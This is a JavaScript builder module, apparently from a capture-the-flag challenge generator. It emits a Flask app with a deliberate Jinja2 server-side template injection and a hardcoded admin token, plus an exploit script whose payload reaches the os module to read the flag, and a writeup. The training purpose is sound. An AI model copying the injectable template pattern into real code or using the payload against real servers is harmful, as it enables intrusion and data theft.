/**
 * Web Exploitation — category-specific builder.
 * Phase 1: returns mock challenge files.
 * Phase 3: will call Claude with prompt.md to generate real files.
 */
import { getCategory } from '../index.js';

const cat = getCategory('web');

export default {
  categoryId: 'web',

  async build(spec) {
    const name = spec.challengeName || spec.challenge_name || 'Web Challenge';
    const flag = spec.flags?.[0] || 'Exploit3rs{w3b_d3f4ult}';
    const narrative = spec.narrative || 'Exploit the web application vulnerability.';
    const difficulty = spec.difficulty || 'medium';
    const points = spec.points || 300;

    return [
      {
        path: 'Dockerfile',
        language: 'dockerfile',
        content: `FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 5000
CMD ["python", "app.py"]`,
      },
      {
        path: 'requirements.txt',
        language: 'text',
        content: 'flask==3.0.0\ngunicorn==21.2.0',
      },
      {
        path: 'app.py',
        language: 'python',
        content: `#!/usr/bin/env python3
"""${name} - Vulnerable Web Application"""
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
FLAG = os.environ.get("FLAG", "${flag}")

@app.route("/")
def index():
    return """<h1>${name}</h1>
    <p>Welcome to the challenge. Find the vulnerability and capture the flag.</p>
    <form action="/search" method="GET">
        <input name="q" placeholder="Search..." />
        <button type="submit">Search</button>
    </form>"""

@app.route("/search")
def search():
    q = request.args.get("q", "")
    template = f"<h1>Results for: {q}</h1><p>No results found.</p>"
    return render_template_string(template)

@app.route("/admin")
def admin():
    token = request.headers.get("X-Admin-Token", "")
    if token == "s3cr3t-4dm1n-t0k3n":
        return FLAG
    return "Unauthorized", 403

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)`,
      },
      {
        path: 'exploit.py',
        language: 'python',
        content: `#!/usr/bin/env python3
"""Exploit script for ${name}"""
import requests, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
print(f"[*] Targeting {TARGET}")
print("[*] Step 1: Discovering template injection...")
payload = "{{config}}"
r = requests.get(f"{TARGET}/search", params={"q": payload})
if "SECRET_KEY" in r.text or "Config" in r.text:
    print("[+] Template injection confirmed!")
else:
    print("[-] Template injection not found"); sys.exit(1)
print("[*] Step 2: Extracting flag via SSTI...")
ssti_payload = "{{request.application.__globals__.__builtins__.__import__('os').environ.get('FLAG')}}"
r = requests.get(f"{TARGET}/search", params={"q": ssti_payload})
print(f"[+] Flag: {r.text}")`,
      },
      {
        path: 'writeup.md',
        language: 'markdown',
        content: `# ${name} - Writeup

## Challenge Description
${narrative}

## Difficulty
${difficulty} (${points} points)

## Solution
1. Navigate to the web application and identify input fields.
2. The search endpoint is vulnerable to Server-Side Template Injection (SSTI).
3. Use Jinja2 SSTI payloads to read environment variables.
4. The flag is stored in the FLAG environment variable.

## Flag
\`${flag}\``,
      },
    ];
  },
};
